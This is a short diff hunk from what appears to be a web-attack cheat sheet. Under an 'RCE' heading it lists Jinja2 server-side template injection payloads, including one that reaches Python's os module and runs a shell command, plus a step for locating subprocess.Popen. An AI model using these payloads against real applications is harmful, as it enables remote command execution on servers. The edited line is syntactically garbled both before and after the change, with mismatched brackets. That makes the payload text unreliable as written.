@@ -56,7 +56,7 @@ RCE:
 
 {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
 {{ ''.__class__.__mro__[1].__subclasses__() }}  → find subprocess.Popen index
-{{ ''.__class__.__mro__[[)[INDEX]('id',shell=True,stdout=-1|1]].communicate() }}
+{{ ''.__class__.__mro__[1]()[INDEX).communicate() }}
 ```
 
 LFI
